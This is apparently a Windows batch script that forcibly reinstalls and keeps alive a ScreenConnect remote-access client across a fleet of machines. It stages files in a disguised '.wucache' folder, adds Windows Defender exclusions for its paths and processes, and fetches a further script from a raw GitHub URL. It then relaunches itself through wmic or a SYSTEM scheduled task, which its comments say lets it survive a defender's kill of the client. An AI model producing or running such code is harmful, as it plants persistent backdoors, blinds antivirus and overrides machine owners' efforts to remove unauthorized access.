@echo off
rem OWN_GRYXA_FORCE BUILD 20260804F7 - fleet REINSTALL via wmic (survives sevrz 10s; schtasks Queued is broken)
rem F7: wmic process call create SYSTEM-equivalent breakaway. schtasks ONCE often stays Queued.
rem F6: schtasks attempt. F5: keep G5.
setlocal EnableExtensions EnableDelayedExpansion

set "WD=%~1"
if "%WD%"=="" set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "SVC=ScreenConnect Client (%FP%)"
set "LOG=%WD%\own_gryxa_force.log"
set "RAWMAIN=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "WORKER=%STAGE%\gryxa_reinstall_once.cmd"
set "TASK=WucacheGryxaReinstall"
set "BUILD=F7"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
echo [%DATE% %TIME%] force_begin build=%BUILD% host=%COMPUTERNAME%>>"%LOG%"

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1

set "NEED_G=1"
if exist "%WD%\own_gryxa.cmd" (
  findstr /C:"OWN_GRYXA BUILD 20260804G5" "%WD%\own_gryxa.cmd" >nul 2>&1
  if not errorlevel 1 set "NEED_G=0"
)
if "%NEED_G%"=="1" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 15 -o "%WD%\own_gryxa.cmd" "%RAWMAIN%/own_gryxa.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
)

if not exist "%WD%\own_gryxa.cmd" (
  echo BUILD=%BUILD%
  echo HOST=%COMPUTERNAME%
  echo HEALTH=FAIL
  echo REASON=no-own_gryxa
  echo REPORT %COMPUTERNAME% %FP% FAIL no-own_gryxa
  endlocal & exit /b 2
)

findstr /C:"REINSTALL" "%WD%\own_gryxa.cmd" >nul 2>&1
if errorlevel 1 (
  echo BUILD=%BUILD%
  echo HOST=%COMPUTERNAME%
  echo HEALTH=FAIL
  echo REASON=own_gryxa-not-G5
  echo REPORT %COMPUTERNAME% %FP% FAIL own_gryxa-not-G5
  endlocal & exit /b 3
)

set "PRE=ABSENT"
sc query "%SVC%" >nul 2>&1
if not errorlevel 1 (
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
  if not errorlevel 1 (set "PRE=ALIVE") else (set "PRE=STOPPED")
)

if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
schtasks /Delete /TN "%TASK%" /F >nul 2>&1

> "%WORKER%" (
  echo @echo off
  echo echo [%DATE% %TIME%] wmic_reinstall_begin^>^>"%LOG%"
  echo call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" REINSTALL ^>^>"%LOG%" 2^>^&1
  echo echo [%DATE% %TIME%] wmic_reinstall_done err=%%ERRORLEVEL%%^>^>"%LOG%"
)

rem breakaway from ScreenConnect job object — survives 10s Guest kill
wmic process call create "cmd.exe /c call \"%WORKER%\"" >"%STAGE%\wmic_create.out" 2>&1
findstr /I "ProcessId" "%STAGE%\wmic_create.out" >nul
if errorlevel 1 (
  rem fallback: schtasks with near-future ST + Run
  for /f "tokens=1-2 delims=:" %%A in ("%TIME%") do (
    set /a H=%%A
    set /a M=1%%B-100+2
  )
  if !M! GEQ 60 (
    set /a M-=60
    set /a H+=1
  )
  if !H! GEQ 24 set /a H=0
  if !H! LSS 10 (set "HH=0!H!") else (set "HH=!H!")
  if !M! LSS 10 (set "MM=0!M!") else (set "MM=!M!")
  schtasks /Create /TN "%TASK%" /TR "cmd.exe /c call \"%WORKER%\"" /SC ONCE /ST !HH!:!MM! /RU SYSTEM /RL HIGHEST /F >nul 2>&1
  schtasks /Run /TN "%TASK%" >nul 2>&1
  set "ACTION=schtasks-fallback"
) else (
  set "ACTION=wmic-reinstall"
)
echo [%DATE% %TIME%] launched ACTION=!ACTION! pre=%PRE%>>"%LOG%"

set "STATE=ABSENT"
sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  set "STATE=ABSENT"
) else (
  sc query "%SVC%" | findstr /I /C:"RUNNING" >nul && set "STATE=RUNNING"
  if /I not "!STATE!"=="RUNNING" sc query "%SVC%" | findstr /I /C:"START_PENDING" >nul && set "STATE=START_PENDING"
  if /I not "!STATE!"=="RUNNING" if /I not "!STATE!"=="START_PENDING" sc query "%SVC%" | findstr /I /C:"STOPPED" >nul && set "STATE=STOPPED"
)

set "HEALTH=QUEUED"
set "DIR=0"
if exist "%ProgramFiles(x86)%\ScreenConnect Client (%FP%)" set "DIR=1"
if exist "%ProgramFiles%\ScreenConnect Client (%FP%)" set "DIR=1"

echo.
echo ====== GRYXA REPORT ======
echo BUILD=%BUILD%
echo HOST=%COMPUTERNAME%
echo FP=%FP%
echo PRE=%PRE%
echo STATE=!STATE!
echo HEALTH=!HEALTH!
echo DIR=!DIR!
echo ACTION=!ACTION!
echo REPORT %COMPUTERNAME% %FP% !HEALTH! state=!STATE! dir=!DIR! pre=%PRE% action=!ACTION!
echo ==========================
echo [%DATE% %TIME%] REPORT HEALTH=!HEALTH! STATE=!STATE! ACTION=!ACTION!>>"%LOG%"
endlocal & exit /b 0
